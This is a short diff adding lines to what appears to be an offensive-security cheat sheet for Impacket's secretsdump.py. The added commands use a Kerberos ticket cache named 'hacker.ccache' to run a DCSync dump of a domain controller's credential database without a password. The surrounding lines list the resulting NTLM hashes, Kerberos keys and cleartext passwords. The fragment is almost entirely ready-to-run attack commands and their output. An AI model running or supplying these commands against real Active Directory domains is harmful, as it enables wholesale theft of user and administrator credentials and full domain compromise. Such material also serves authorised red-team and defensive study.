@@ -444,6 +444,10 @@ secretsdump.py -outputfile hashes_list -just-dc <DOMAIN>/<USER-3>:<PASS>@<DC-IP>
 -user-status         # Show account status (enabled/disabled/locked)
 -outputfile FILE     # Save dumped hashes to file with the given prefix
 
+# with TGT ticket 
+export KRB5CCNAME=hacker.ccache 
+secretsdump.py -k -no-pass <DOMAIN>/<USER>@<DC-IP> -just-dc -outputfile hashes_list # -k → Use Kerberos authentication (ticket from KRB5CCNAME)
+
 # Listing Hashes, Kerberos Keys, and Cleartext Passwords
 ls hashes_list*
 #=> hashes.ntds (NTLM hash) hashes.ntds.cleartext (txt)  hashes.ntds.kerberos (keys)
